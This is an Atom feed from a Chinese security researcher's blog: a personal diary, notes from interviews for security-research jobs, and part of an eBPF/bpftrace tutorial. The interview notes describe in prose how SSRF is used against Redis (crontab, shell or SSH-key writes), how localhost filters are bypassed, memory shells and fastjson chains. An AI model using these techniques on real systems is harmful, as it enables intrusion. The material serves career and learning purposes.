<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>芜风</title>
  
  <subtitle>崖余</subtitle>
  <link href="https://drun1baby.github.io/atom.xml" rel="self"/>
  
  <link href="https://drun1baby.github.io/"/>
  <updated>2023-08-18T05:19:55.691Z</updated>
  <id>https://drun1baby.github.io/</id>
  
  <author>
    <name>Drun1baby</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>往回看，新启程</title>
    <link href="https://drun1baby.github.io/2099/09/09/%E5%BE%80%E5%9B%9E%E7%9C%8B%EF%BC%8C%E6%96%B0%E5%90%AF%E7%A8%8B/"/>
    <id>https://drun1baby.github.io/2099/09/09/%E5%BE%80%E5%9B%9E%E7%9C%8B%EF%BC%8C%E6%96%B0%E5%90%AF%E7%A8%8B/</id>
    <published>2099-09-09T13:07:40.000Z</published>
    <updated>2023-08-18T05:19:55.691Z</updated>
    
    <content type="html"><![CDATA[<p>用这篇文章来记录一些碎碎念的东西吧</p><span id="more"></span><ul><li>Weblogic 系列漏洞</li><li>golang 重构一下 sqlmap</li><li>扫描器的开发，向朱老师请教一下 cel-go 的项目</li></ul><h2 id="2022-9-9-新启程"><a href="#2022-9-9-新启程" class="headerlink" title="2022.9.9 新启程"></a>2022.9.9 新启程</h2><p>有幸被木爷指点了一番，也非常荣幸朱老师指点了我很久，真的感受到了自己的很多不足，而且差点路就走偏了。</p><blockquote><p><strong>Java 安全很多时候不只是反序列化，还有很多代码审计</strong>；还有很多很多东西。</p></blockquote><p>最近一直在看反序列化，我确实感觉自己基础不错，但是确实我发现了自己代码审计这块很不好，其实当初在给师傅们培训的时候我就感受到了，自己 Java Web 确实不够 <strong>扎实</strong>，万丈高楼平地起。</p><ul><li>木爷告诉我有时候是需要结果论，而不是过程论的，确实，这个时代是看结果的。</li></ul><font color=red>    <p>然后要养成独立思考的习惯，注意，这个真的是独立思考。少看安服崽的文章，真的害人不浅。比如，怎么说呢？你学一个 log4j2 的漏洞，你学他，不光学，还要设想如何 bypass。</p><p>比如你知道了 fastjson 漏洞，一开始你懂了原理，后续的链子漏洞就可以从漏洞发现者的角度去思考了，并且多多思考 bypass；这真的很重要。</p></font><p>还有，Java 安全不光是反序列化，反序列化相对于 Java 安全，就像 SQL 注入相对于渗透测试，很好防。</p><p>多看代码审计，多多理解，静下心来，好好沉淀，安研还有一丝希望。</p><p>其他项目也就不要管了，专注于一个方向就好了，冲！！！</p><h2 id="2022-11-6"><a href="#2022-11-6" class="headerlink" title="2022.11.6"></a>2022.11.6</h2><p>和心理咨询师沟通了一次，感觉很多东西得到了认知，很舒服，之前一直觉得自己好像对安全不是那么有热情了，其实不是这样的。</p><p>有热情与没有热情，它们不是 0 分和 100 分的区别。</p><p>因为热情是一个很唯心主义的东西，你觉得有就是有，你觉得没有就是没有。所以可能只是热情低，但不是没有热情。</p><p>再说到爱好与工作，很多人说把爱好变成饭碗之后，会变得不热情。但其实还有那么多人找工作是为了养家糊口，自己作者自己热爱的事情难道不是一种热爱吗？</p><p>解决了困扰了我很久的心理问题。</p><h2 id="2023-2-12"><a href="#2023-2-12" class="headerlink" title="2023.2.12"></a>2023.2.12</h2><p>自放寒假自己状态就不是特别好，所幸最近调整过来了</p><h2 id="2023-4-20"><a href="#2023-4-20" class="headerlink" title="2023.4.20"></a>2023.4.20</h2><p>如果真的不行换类似好入的方向</p><h2 id="2023-5-29"><a href="#2023-5-29" class="headerlink" title="2023.5.29"></a>2023.5.29</h2><p>早在大概五一过后已经入职了杭州安恒，卫兵实验室。在入职后很长一段时间都很焦虑，害怕被开除，后面在淚笑大师傅的帮助下，我学习到了很多很多很多东西，这位大师傅真的帮助了我很多很多，非常感谢他。</p><h2 id="2023-8-6"><a href="#2023-8-6" class="headerlink" title="2023.8.6"></a>2023.8.6</h2><p>准备好迎接真正的挑战</p><h2 id="2023-8-15"><a href="#2023-8-15" class="headerlink" title="2023.8.15"></a>2023.8.15</h2><p>这一天和表姐表弟聊了很多，发现大家都同为迷茫的年轻人，而在迷茫之后少不了内耗，好在最终都走出了迷茫。</p><h2 id="2023-8-18"><a href="#2023-8-18" class="headerlink" title="2023.8.18"></a>2023.8.18</h2><p>好消息不断的一天，很开心</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;用这篇文章来记录一些碎碎念的东西吧&lt;/p&gt;</summary>
    
    
    
    <category term="碎碎念" scheme="https://drun1baby.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="碎碎念" scheme="https://drun1baby.github.io/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>2023 春招安全研究岗位面经分享</title>
    <link href="https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/"/>
    <id>https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/</id>
    <published>2023-08-23T14:39:22.000Z</published>
    <updated>2023-08-23T14:55:25.862Z</updated>
    
    <content type="html"><![CDATA[<p>随手记录一下</p><span id="more"></span><h2 id="安恒卫兵实验室"><a href="#安恒卫兵实验室" class="headerlink" title="安恒卫兵实验室"></a>安恒卫兵实验室</h2><p>1、你的简历与你之前发过来的简历有什么变化吗？</p><p>2、说一说你研究过的东西，然后有什么产出</p><p>这里我说研究了 Weblogic、shiro，但是没产出，那边似乎比较失望。</p><p>3、最近出了 Weblogic 的一个新的洞，你有研究过吗？自己在研究的时候有没有思考过别人是怎么挖出来的洞。</p><p>人麻了，没复现漏洞过，然后也没思考过这个。。</p><p>4、你觉得挖什么样子的洞比较好呢？你一般是怎么开展研究的</p><p>我说看漏洞类型，但是无论如何你需要先去简单了解一下它的流程，如果一个组件的流程你不清楚，盲目的开始挖洞比较愚蠢，像盲人摸象。然后在了解过基础流程之后，如果是反序列化的洞，就用 codeql、tabby 这些东西去找漏洞。</p><p>不知道那边是什么想法，不过有一说一面我的时候感觉大部分时候都是吸气和叹气qaq</p><p>5、你学习安全是什么时候开始的呢，一路上的经历是怎么样的</p><p>就简单聊了聊</p><p>6、有没有什么让你感觉很自豪的项目</p><p>。。。。。有个锤子，当时说了 golang 写 sqlmap</p><p>7、你是什么状况下去学习 golang 的呢？是出于什么考虑呢</p><p>似乎很多面试官都会问这个问题，还是和之前一样回答了一下。</p><p>8、为什么在连连只实习了一个月呢？都做了什么业务</p><p>xxx</p><p>9、能简单说说在连连做了什么渗透测试吗？当时说了越权的，他问除了越权呢？当时真的太菜了。。。总不能说我在整理文档吧妈个鸡的。</p><p>10、能说一说常见的 SQL 注入种类吗？自己有绕过过一些 SQL 注入的 waf 吗？</p><p>这里说了绕过安全狗，麻了，当时就想到很可能会问 HIDS 的相关内容，果不其然后面就问了</p><p>11、一般是怎么绕 waf 呢？具体说说</p><p>我说了先 fuzz，然后具体的 bypass 就根据可用字符来打，那边似乎很不满意</p><p>12、有遇到过语意型的 waf 吗？自己是怎么 bypass 的呢？</p><p>我这里真的有点麻，满脑子都是 HIDS 和阿里的产品，包括先知 ban waf</p><p>13、如果给到你一个1day，你要怎么样进行漏洞分析呢？</p><p>大脑宕机中，我感觉这里给的范围就很宽泛啊，应该要给漏洞类型吧至少。于是乎我回答，先简单分析一下它的流程，然后根据漏洞类型来找。比如你是个反序列化的洞，我就去找 source sink。似乎那边相当不满意</p><p>14、又问了我如果就是一个 SQL 注入的 1day，让你漏洞分析，你会怎么分析呢，比如是有些特定条件下的 SQL 注入，比如什么什么配置文件下，你会怎么分析呢？</p><p>我回答的和之前差不多，但是这里很明显不对，应该细聊一下 SQL 注入。</p><p>15、那你这样分析流程不会很耗时间吗？如果ddl之前你还没有分析完漏洞呢？你会怎么办？</p><p>。。。。。。。。。。<br>我说我会加班，然后静下心来好好分析。</p><p>16、那如果还是分析不出来，你是不是要思考一下你的方法是不是有问题了</p><p>我: 。。。。。。。。。。。。。。。嗯……应该是吧</p><p>17、那如果你的 1day 积累的很多都完不成呢</p><p>我说我可能会考虑问一下其他有过经验的师傅，多多取经。</p><p>我大致了解你的情况了，能说说 SSRF 怎么样才能最好的利用呢？</p><p>我说，SSRF 用的好的话是可以 rce 的，但是前提是你需要先探活。当然这里 rce 的方式有很多，比如配合文件上传 gopher 打。</p><p>18、那如果目前我们探活出来有个 redis 服务，你要怎么打呢</p><p>SSRF 打 redis 的本质就是仿 redis 命令，将其写入一些 shell。我答了最多的一般都是 crontab，还有写入 shell，就类似于文件包含的原理。其实还有写入 ssh 私钥。还有主从复制什么的。</p><p>19、能说一说 ssrf 的防御嘛</p><p>我说了加白，最常用的方法，后续又补充了说限制一些不必要的协议，像 gopher 这种完全没必要啊，还有就是不给回显，这样的话对方探活也探不出什么东西，可能就以为这里并不存在 ssrf，但还得是白名单牛逼</p><p>20、那如果在变量里面呢？你要怎么过滤</p><p>我感觉这里就是加个 filter，实现单一职责原则</p><p>21、那如果我这里限制了 127.0.0.1，限制了 127.0.0.2 ，那你要怎么 bypass 呢</p><p>我直接说了 dns rebinding，我说这种攻击非常可观。面试官问我还有没有其他的呢？我补充了 @ 符绕过，进制转换，句号替换.符号。</p><p>22、能展开讲讲 @ 符是这么绕过的吗</p><p>这里其实是和 url 协议是有关系的，因为我们本质的 url 协议是这样请求资源的<br>http∶&#x2F;&#x2F;url@ip，然后后面跟上请求的资源，比如 <a class="link"   href="http://www.baidu.com@1.1.1.1,那么我们这里把后面/" >http://www.baidu.com@1.1.1.1，那么我们这里把后面<i class="fas fa-external-link-alt"></i></a> @ 的内容修改成恶意的 127.0.0.1即可。</p><p>23、面试官又问，如果把这些各种符号都禁了呢，因为很多时候我们会过滤这些输入。</p><p>我说那就 dns rebinding 呗，面试官说 dns rebinding 的事儿到时候再说。然后答了进制转换，他说算一种，又答了 xip.io 与 xip.name<br>泛域名解析，无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。</p><p>24、关于内存马有了解嘛？可以简单讲讲有哪些内存马吗？</p><p>我说了我只搞了 Tomcat 型内存马，我知道还有 Agent 型内存马和 websocket 型，还有 upgrade 型内存马。</p><p>25、内存马的查杀了解过原理吗？</p><p>我麻了，我说看调用的所有的filters，看哪些 filters 是恶意的，是程序没有的</p><p>26、后面问了问实习薪资期望</p><blockquote><p>接下来就是反问环节</p></blockquote><h2 id="白帽汇安全研究面试"><a href="#白帽汇安全研究面试" class="headerlink" title="白帽汇安全研究面试"></a>白帽汇安全研究面试</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>1、自我介绍</p><p>2、讲一讲最近在做什么吧</p><p>3、说一说 Shiro 这个洞都了解多少</p><p>4、自己有没有独立挖出过 0day</p><p>5、weblogic 了解多少</p><p>说了一下复现了的漏洞，然后面试官让我说一说具体的一个漏洞</p><p>6、weblogic 的 T3 和 XMLDecoder 漏洞展开讲讲吧</p><p>7、fastjson 复现过多少漏洞，你研究的版本是多少</p><p>8、能简单说一说 Java 反序列化的流程吗？</p><p>9、讲讲 RMI 的通信原理以及为什么会存在漏洞</p><p>10、看到你还有在看 PHP 的东西，一般是研究哪种为主呢，PHP 还是 Java</p><p>11、说一说你做过的一些项目吧</p><p>12、写这个 Java 路线，你是出于什么考虑呢？</p><p>13、看到你审计过一些 CMS，自己从中有什么收获吗？</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面主要是聊了聊一些挖洞的思想&#x2F;个人经历，很有聊天的感觉，个人忘记记录完全了。</p><h3 id="HR-面"><a href="#HR-面" class="headerlink" title="HR 面"></a>HR 面</h3><p>1、看到你的简历上写了有说网络安全协会，都做了协会哪些工作呢</p><p>2、预期薪资是多少呢，我说在北京差不多 330&#x2F;天吧</p><p>后面又说给实习生薪资一个月是 5500</p><p>3、有没有一段很难的时光</p><p>4、你是独生子女吗</p><p>5、最让你自豪的一件事是什么</p><p>6、在 CTF 上让你有很自豪的事情吗</p><p>7、有收到其他家的 offer 吗</p><p>8、目前多久能过来呢</p><h2 id="极氪安全研究"><a href="#极氪安全研究" class="headerlink" title="极氪安全研究"></a>极氪安全研究</h2><p>1、简单说一说你作为红队，在 hvv 期间会有怎样的视角</p><p>我说，这是不是就是 hvv 视角下的红队攻击。面试官说是的</p><p>然后就说了社工钓鱼、信息收集、外网打点、内网横移、还有就是通过信息泄露拿源码，再进行源码审计，再就是 0day、1day 的应用、恶意流量分析</p><p>2、听到你说了源码审计，简单说一下思路吧</p><p>就还是那一套 filter ——&gt; pom.xml ——&gt; 细的功能点 ——&gt; 调试</p><p>3、说一说如果 hvv 期间出了一个 fastjson 的 day，你需要怎么防护</p><p>给我特么问住了，面试官其实在这个过程中一直在向我往工具利用那方面引导。我说了加黑，然后加白这样的策略。</p><p>他又和我说，怎么样判断资产里面是否存在这个漏洞呢。我说用工具测，说如果你们有比较成熟的白盒扫描工具是可以的，但是我没用过。反正这个问题纠结了很久。。。。</p><p>4、说一说内网横移的思路吧</p><p>我说分 Windows 和 Linux，Linux 比较难横移；Windows 就还是那一套</p><p>5、说一说除了 web 服务之外还有服务值得注意</p><p>这个问题问的挺。。。隐晦</p><p>其实就是问有哪些端口，我就说了那些</p><p>6、说一说你用 python 做过的一些项目吧</p><p>简单聊了聊</p><p>7、有做过白盒代码审计的一些项目吗</p><p>没有</p><p>8、如果你挖掘 Java 反序列化的 0day，你会怎么挖掘呢</p><p>就还是那样</p><blockquote><p>下面是反问环节</p></blockquote><p>主要问了问他们的业务、转正、一般上班强度如何、部门地位如何、食堂</p><p>就这些</p><h2 id="墨云科技安全研究"><a href="#墨云科技安全研究" class="headerlink" title="墨云科技安全研究"></a>墨云科技安全研究</h2><p>总体上来说和白帽汇的面试很像，当时便没有记录，而且问的很急</p><h2 id="奇安信观星实验室"><a href="#奇安信观星实验室" class="headerlink" title="奇安信观星实验室"></a>奇安信观星实验室</h2><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><p>1、先做个自我介绍吧</p><p>2、我看你有复现过一些 Java 反序列化的漏洞，简单讲一讲漏洞原理吧。</p><p>easy</p><p>3、在这些反序列化的链子里面，有什么比较共通的地方吗</p><p>我说了链首、链尾、sink 要求</p><p>4、你有审计 Java 代码的经验，可以简单说一说吗？</p><p>说了一些思路</p><p>5、我看你 CTF 打的很多，其中应该有很多 PHP 吧，然后你挖的 PHP 洞也挖了几个，简单讲讲让你印象深刻的洞吧。</p><p>说了一个 SQL 注入，一个 phar</p><p>6、我看你复现过 fastjson 系列的洞，说一说最新的那个 fastjson 1.2.80 的洞吧，就浅蓝挖的那个</p><p>日了。。。我没很好的复现过</p><p>7、那你说一说 fastjson 的一些漏洞原理和绕过思路吧</p><p>我说了一些，但是有一条通杀的 jdbc 没有很好的分析过，后悔。</p><p>8、PHP 反序列化的漏洞挖掘思路可以说一下吗？</p><p>这个不会</p><p>9、jpress 我看你有审计的校验，有自己搞出来一些前台 RCE 吗</p><p>无</p><p>10、简单聊一聊 Java 内存马吧，原理以及如何写入</p><p>后面就是反问环节，问了一下他们的业务，然后大概组织架构，转正情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><p>说实话二面没有准备好，因为一些特殊原因</p><p>1、做个自我介绍吧，主要讲一讲自己研究哪个方向。</p><p>2、PHP 审计过哪些大型的 CMS 呢</p><p>我说了 TP，还有一些其他的自己审计的</p><p>3、TP 里面不是有个命令执行吗？可以说一说里面大概后利用是怎么利用的，比如现在目标站开启了 <code>disabled_function</code></p><p>我这里有点麻，本身 PHP 就不是很好，我说如果利用角度来说，蚁剑的插件就行，如果没有这个条件的话就手动写入 <code>.so</code> 文件</p><p>那你详细说一说怎么写进去…… 寄、我忘了具体利用手法</p><p>4、PHP 里面的 extract 变量覆盖这个问题，有在实际漏洞挖掘的时候遇到过吗</p><p>没有</p><p>5、面试官似乎还是很想问 PHP 的，问了 PHP 的另外一个问题，还是没怎么答出来。</p><p>又问了问 最近打的 CTF，主要是 ant 和 阿里云，让我讲讲印象深刻的题目，我都忘得差不多了。。</p><p>6、说一说 Java JDBC MySQL 反序列化这个漏洞吧</p><p>我说这只是给了一个入口，需要伪造 MySQL fake server</p><p>7、那你说一说怎么判断 MySQL jdbc 的版本吧</p><p>我说 wireshark 抓个包，内容应该会在里面</p><p>8、看你 Java CMS 审计过 jpress，当时是复现还是</p><p>我说了复现，然后让我聊一聊印象最深刻的一个洞</p><p>9、如果现在有个文件上传，但是只有 <code>Web-INF</code> 下的 <code>.jsp</code> 文件才会被渲染，你有什么思路</p><p>我说了 SSTI、crontab、sh、weblogic 的部署都可以</p><p>10、你有在大型攻防演练当中跟进过一些 VMware 类型的漏洞吗？展开聊聊</p><p>我说我只做过蓝队，然后 VMware 的话，最新的洞正在看。然后简单讲一讲，感觉面试官没有复现这个漏洞</p><p>11、听你说分析了 RocketMQ 的洞，简单聊聊吧</p><p>就简单聊了聊</p><p>12、那如果不出网呢？</p><p>。。。。我说这个单纯从这个漏洞的角度来说，其实是可以写入 crontab 的，但是实际打内存马，我还没有试过。</p><p>下面就是反问环节</p><h2 id="沥泉科技红队安全研究"><a href="#沥泉科技红队安全研究" class="headerlink" title="沥泉科技红队安全研究"></a>沥泉科技红队安全研究</h2><p>1、做个自我介绍吧</p><p>2、看你漏洞这块，Java，PHP，Python 都有了解是吗？简单说一说怎么审计 PHP 漏洞的吧。</p><p>说了用 Seay 扫一扫，然后对扫出来的重点去审计，黑白盒结合一起打</p><p>3、Seay 是很老的东西了，你有没有修改一下它的规则什么的</p><p>答：没有。。。寄</p><p>4、如果你没有修改过的话，那你怎么样才能挖出别人挖不出来的洞呢？</p><p>不会啊。。麻了</p><p>5、说一说了解的 Java 漏洞吧，像 fastjson、shiro 这些，就先说说 fastjson 吧，你对它了解多少。</p><p>这里我说了说 fastjson 最好用的两条链子，一条是 templatesImpl 的，另外一条是不出网的 BCEL。</p><p>6、简单说一说 fastjson 的 checkAutoType 吧</p><p>如果开启了就是先白名单过滤，再黑名单。</p><p>如果没开启就是会先黑名单，再白名单。</p><p>7、那关于 fastjson 的 parse 和 parseObject 呢？</p><p>parseObject：返回 fastjson.JSONObject 类</p><p>parse ：返回我们的类 User</p><p>一般来说 parseObject 的利用面更广</p><p>8、有学过哪些框架和组件呢？为什么要学他们</p><p>就简单说了说，不过我的回答好像让那边挺满意的</p><p>9、关于 Shiro 的漏洞，有了解吗？展开说说</p><p>说了 550，721 和权限绕过</p><p>10、说一说 721 的 Oracle Padding Attack 的原理</p><p>寄，没背过</p><p>11、你用 Python 写过什么工具吗</p><p>说了说自己写了爬虫，然后写了个网段扫描的工具。</p><p>12、说到 nmap，一般 nmap 扫描很慢的时候会怎么办呢？</p><p>这里应该是用 msscan 比较好</p><p>13、有了解过内网么？说一说 Kerberos 协议的流程吧，后面又问了 NTLM 协议的流程</p><p>寄</p><p>14、除了 NTLM Hash，还知道哪些 Hash 呢</p><p>寄</p><p>15、src 自己有在挖嘛，简单说一说信息收集的一些方法吧。</p><p>寄，后门 l3m0n 师傅说有十多种方法。。。</p><p>16、话说 fastjson 需要碰到高版本的 jdk8 的时候要怎么绕过呢</p><p>这个其实就是 jndi 打高版本 jdk 的思路</p><p>17、Java 设计模式了解多少呢</p><p>18、打 CTF 是跟着战队拿奖还是自己校队拿奖</p><p>19、内网渗透的流程都了解吗</p><p>20、我大致了解你的情况了，可以说一说你的规划预期吗</p><hr><p>接下来就是反问环节，主要是问了问他们到底是做什么业务的。</p><p>面我的是 l3m0n 师傅，很强</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>投的太晚了，金三银四，我是四月底投的，差不多五月初的样子，这个非常不利。</p><p>自己能力上还是有非常多的不足。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随手记录一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="面经" scheme="https://drun1baby.github.io/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 内核跟踪</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/</id>
    <published>2023-08-06T07:38:53.000Z</published>
    <updated>2023-08-09T08:35:46.003Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 内核跟踪，eBPF 学习（四）</p><span id="more"></span><h1 id="eBPF-内核跟踪"><a href="#eBPF-内核跟踪" class="headerlink" title="eBPF 内核跟踪"></a>eBPF 内核跟踪</h1><p>今天我们先来看看，怎样使用 eBPF 去跟踪内核的状态，特别是最简单的 bpftrace 的使用方法。在下一讲中，我还将介绍两种 eBPF 程序的进阶编程方法。</p><p>上一讲中提到过，跟踪类 eBPF 程序主要包含内核插桩（<code>BPF_PROG_TYPE_KPROBE</code>）、跟踪点（<code>BPF_PROG_TYPE_TRACEPOINT</code>）以及性能事件（<code>BPF_PROG_TYPE_PERF_EVENT</code>）等程序类型，而每类 eBPF 程序类型又可以挂载到不同的内核函数、内核跟踪点或性能事件上。当这些内核函数、内核跟踪点或性能事件被调用的时候，挂载到其上的 eBPF 程序就会自动执行。</p><p>那么，你可能想问了：当我不知道内核中都有哪些内核函数、内核跟踪点或性能事件的时候，可以在哪里查询到它们的列表呢？对于内核函数和内核跟踪点，在需要跟踪它们的传入参数和返回值的时候，又该如何查询这些数据结构的定义格式呢？别担心，接下来就跟我一起去探索下吧。</p><h2 id="bpftrace-查询跟踪点的几种方法"><a href="#bpftrace-查询跟踪点的几种方法" class="headerlink" title="bpftrace 查询跟踪点的几种方法"></a>bpftrace 查询跟踪点的几种方法</h2><blockquote><p>官方文档 <a class="link"   href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md" >https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md<i class="fas fa-external-link-alt"></i></a></p></blockquote><h3 id="利用调试信息查询跟踪点"><a href="#利用调试信息查询跟踪点" class="headerlink" title="利用调试信息查询跟踪点"></a>利用调试信息查询跟踪点</h3><p>实际上，作为一个软件系统，内核也经常会发生各种各样的问题，比如安全漏洞、逻辑错误、性能差，等等。因此，内核本身的调试与跟踪一直都是内核提供的核心功能之一。</p><p>比如，为了方便调试，内核把所有函数以及非栈变量的地址都抽取到了  <code>/proc/kallsyms</code>  中，这样调试器就可以根据地址找出对应的函数和变量名称。很显然，具有实际含义的名称要比 16 进制的地址易读得多。对内核插桩类的 eBPF 程序来说，它们要挂载的内核函数就可以从  <code>/proc/kallsyms</code>  这个文件中查到。</p><p>注意，内核函数是一个非稳定 API，在新版本中可能会发生变化，并且内核函数的数量也在不断增长中。以 v5.13.0 为例，总的内核符号表数量已经超过了 16 万：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span><span class="token number">165694</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过需要提醒你的是，这些符号表不仅包含了内核函数，还包含了非栈数据变量。而且，并不是所有的内核函数都是可跟踪的，只有显式导出的内核函数才可以被 eBPF 进行动态跟踪。因而，通常我们并不直接从内核符号表查询可跟踪点，而是使用我接下来介绍的方法。</p><p>为了方便内核开发者获取所需的跟踪点信息，内核<a class="link"   href="https://www.kernel.org/doc/html/latest/filesystems/debugfs.html" >调试文件系统<i class="fas fa-external-link-alt"></i></a>还向用户空间提供了内核调试所需的基本信息，如内核符号列表、跟踪点、函数跟踪（ftrace）状态以及参数格式等。你可以在终端中执行  <code>sudo ls /sys/kernel/debug</code>  来查询内核调试文件系统的具体信息。比如，执行下面的命令，就可以查询  <code>execve</code>  系统调用的参数格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cat</span> /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意，eBPF 程序的执行也依赖于调试文件系统。如果你的系统没有自动挂载它，那么我推荐你把它加入到系统开机启动脚本里面，这样机器重启后 eBPF 程序也可以正常运行。</p><p>有了调试文件系统，你就可以从  <code>/sys/kernel/debug/tracing</code>  中找到所有内核预定义的跟踪点，进而可以在需要时把 eBPF 程序挂载到对应的跟踪点。</p><p>除了内核函数和跟踪点之外，性能事件又该如何查询呢？你可以使用 Linux 性能工具  perf  来查询性能事件的列表。如下面的命令所示，你可以不带参数查询所有的性能事件，也可以加入可选的事件类型参数进行过滤：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> perf list <span class="token punctuation">[</span>hw<span class="token operator">|</span>sw<span class="token operator">|</span>cache<span class="token operator">|</span>tracepoint<span class="token operator">|</span>pmu<span class="token operator">|</span>sdt<span class="token operator">|</span>metric<span class="token operator">|</span>metricgroup<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="利用-bpftrace-查询跟踪点"><a href="#利用-bpftrace-查询跟踪点" class="headerlink" title="利用 bpftrace 查询跟踪点"></a>利用 bpftrace 查询跟踪点</h3><p>虽然你可以利用内核调试信息和 perf 工具查询内核函数、跟踪点以及性能事件的列表，但它们的位置比较分散，并且用这种方法也不容易查询内核函数的定义格式。所以，我再给你推荐一个更好用的 eBPF 工具  <a class="link"   href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md" >bpftrace<i class="fas fa-external-link-alt"></i></a>。</p><p>bpftrace 在 eBPF 和 BCC 之上构建了一个简化的跟踪语言，通过简单的几行脚本，就可以实现复杂的跟踪功能。并且，多行的跟踪指令也可以放到脚本文件中执行（脚本后缀通常为  <code>.bt</code>）。</p><p>如下图（图片来自 bpftrace文档）所示，bpftrace 会把你开发的脚本借助 BCC 编译加载到内核中执行，再通过 BPF 映射获取执行的结果：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpfTraceResult.png" class=""><p>因此，在编写简单的 eBPF 程序，特别是编写的 eBPF 程序用于临时的调试和排错时，你可以考虑直接使用 bpftrace ，而不需要用 C 或 Python 去开发一个复杂的程序。</p><ul><li>安装 bpf</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> bpftrace<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装好 bpftrace 之后，你就可以执行  <code>bpftrace -l</code>  来查询内核插桩和跟踪点了。比如你可以通过以下几种方式来查询：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查询所有内核插桩和跟踪点</span><span class="token function">sudo</span> bpftrace <span class="token parameter variable">-l</span><span class="token comment"># 使用通配符查询所有的系统调用跟踪点</span><span class="token function">sudo</span> bpftrace <span class="token parameter variable">-l</span> <span class="token string">'tracepoint:syscalls:*'</span><span class="token comment"># 使用通配符查询所有名字包含"execve"的跟踪点</span><span class="token function">sudo</span> bpftrace <span class="token parameter variable">-l</span> <span class="token string">'*execve*'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于跟踪点来说，你还可以加上  <code>-v</code>  参数查询函数的入口参数或返回值。而由于内核函数属于不稳定的 API，在 bpftrace 中只能通过  <code>arg0</code>、<code>arg1</code>  这样的参数来访问，具体的参数格式还需要参考内核源代码。</p><p>比如，下面就是一个查询系统调用  <code>execve</code>  入口参数（对应系统调用 <code>sys_enter_execve</code>）和返回值（对应系统调用 <code>sys_exit_execve</code>）的示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查询execve入口参数格式</span>$ <span class="token function">sudo</span> bpftrace <span class="token parameter variable">-lv</span> tracepoint:syscalls:sys_enter_execvetracepoint:syscalls:sys_enter_execve    int __syscall_nr    const char * filename    const char *const * argv    const char *const * envp<span class="token comment"># 查询execve返回值格式</span>$ <span class="token function">sudo</span> bpftrace <span class="token parameter variable">-lv</span> tracepoint:syscalls:sys_exit_execvetracepoint:syscalls:sys_exit_execve    int __syscall_nr    long ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，你既可以通过内核调试信息和 perf 来查询内核函数、跟踪点以及性能事件的列表，也可以使用 bpftrace 工具来查询。</p><p>在这两种方法中，我更推荐使用更简单的 bpftrace 进行查询。这是因为，我们通常只需要在开发环境查询这些列表，以便去准备 eBPF 程序的挂载点。也就是说，虽然 bpftrace 依赖 BCC 和 LLVM 开发工具，但开发环境本来就需要这些库和开发工具。综合来看，用 bpftrace 工具来查询的方法显然更简单快捷。</p><p>在开发 eBPF 程序之前，还需要在这些长长的函数列表中进行选择，确定你应该挂载到哪一个上。那么，具体该如何选择呢？接下来，就进入我们的案例环节，一起看看内核跟踪点的具体使用方法。</p><h3 id="如何利用内核跟踪点排查短时进程问题？"><a href="#如何利用内核跟踪点排查短时进程问题？" class="headerlink" 